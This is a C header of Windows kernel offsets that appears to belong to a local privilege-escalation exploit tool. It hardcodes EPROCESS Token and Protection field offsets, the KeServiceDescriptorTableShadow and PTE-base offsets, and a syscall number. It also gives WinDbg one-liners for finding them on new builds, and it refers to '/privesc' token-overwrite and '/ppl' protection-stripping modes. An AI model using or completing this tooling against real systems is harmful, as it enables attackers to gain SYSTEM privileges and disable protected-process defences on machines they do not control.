// ============================================================================
//  offsets.h — Windows-build-specific kernel offsets / struct offsets.
//
//  *** What you MUST verify in WinDbg before running on a new build ***
//
//      KeServiceDescriptorTableShadow_Offset_fromNT    (NOT exported)
//      MiGetPteAddress_Offset_fromNT                   (NOT exported)
//      imageFileNameOffset                             (EPROCESS struct layout)
//      tokenOffset                                     (EPROCESS struct layout)
//      protectionOffset                                (EPROCESS, /ppl only)
//
//  Wrong values will BSOD the box. The WinDbg one-liner for each is listed
//  next to the #define.
//
//  *** What is resolved DYNAMICALLY at runtime — no manual update needed ***
//
//      NtSetQuotaInformationFile syscall #     — read from ntdll prologue
//      PsLookupProcessByProcessId kernel addr  — ntoskrnl export + RVA add
//      memcpy kernel addr (used by /privesc)   — ntoskrnl export + RVA add
//      ntoskrnl base address                   — EnumDeviceDrivers (SYSTEM)
//
//  The hardcoded *_Offset_fromNT values for the dynamically-resolved
//  routines are kept below only as a fall-back if the dynamic resolver
//  fails for some reason (e.g. ntoskrnl can't be LoadLibrary'd).
// ============================================================================

#pragma once

// ---- MANUAL — must match your kernel build ---------------------------------

// kd> ? nt!KeServiceDescriptorTableShadow - nt
#define KeServiceDescriptorTableShadow_Offset_fromNT 0xfc72c0

// PTE_BASE pointer lives at (MiGetPteAddress + 0x13) inside ntoskrnl.
// kd> ? (nt!MiGetPteAddress + 0x13) - nt
#define MiGetPteAddress_Offset_fromNT 0x42a8c3

// kd> dt nt!_EPROCESS ImageFileName
#define imageFileNameOffset 0x338

// kd> dt nt!_EPROCESS Token
// EX_FAST_REF (low 4 bits = cached ref count, upper bits = token pointer).
// VERIFY for your build — wrong value will write garbage over arbitrary
// kernel state when /privesc runs.
#define tokenOffset 0x248

// kd> dt nt!_EPROCESS Protection
// _PS_PROTECTION is a 1-byte struct:
//   bits 0..2  Type   (0=None, 1=ProtectedLight, 2=Protected)
//   bit  3     Audit  (reserved)
//   bits 4..7  Signer (0=None, 1=Authenticode, 4=Windows, 6=WinTcb, 7=WinSystem, ...)
// VERIFY for your build before running /ppl — wrong value will write a
// stray byte into adjacent EPROCESS fields.
#define protectionOffset 0x5fa

// ---- DYNAMIC — fall-back only; ignored when runtime resolution succeeds ----

// kd> ? nt!NtSetQuotaInformationFile syscall index (from IDA: ntdll stub)
#define NtSetQuotaInformationFile_syscallnumber 0x1b8

// kd> ? nt!PsLookupProcessByProcessId - nt
#define PsLookupProcessByProcessId_Offset_fromNT 0x9408b0
